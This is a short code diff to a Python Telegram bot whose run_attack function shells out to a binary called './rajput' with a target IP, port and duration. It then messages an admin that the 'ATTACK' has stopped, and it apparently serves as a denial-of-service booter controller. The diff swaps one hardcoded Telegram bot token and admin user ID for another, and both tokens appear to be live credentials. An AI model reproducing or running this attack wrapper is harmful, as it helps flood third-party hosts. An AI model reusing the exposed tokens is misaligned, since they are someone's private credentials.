@@ -7,8 +7,8 @@ from datetime import datetime, timedelta
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 from threading import Thread
 # Configuration
-TOKEN = '7655786078:AAHYocIn3_vOC-dELlfWxqtcdPPkhJvEeAo'
-ADMIN_USER_ID = 1821595166
+TOKEN = '7764861225:AAGZmsdBzEIoSIWs9W7QWmNg9x7lo38X8Aw'
+ADMIN_USER_ID = 7621229972
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
 
@@ -86,7 +86,7 @@ async def run_attack(target_ip, target_port, duration):
     try:
         process = await asyncio.create_subprocess_shell(f"./rajput {target_ip} {target_port} {duration} 900")
         await process.communicate()
-        bot.send_message(ADMIN_USER_ID, f"{username},🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
+        bot.send_message(ADMIN_USER_ID, f"🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
     except Exception as e:
         logging.error(f"Error during attack: {e}")
     finally:
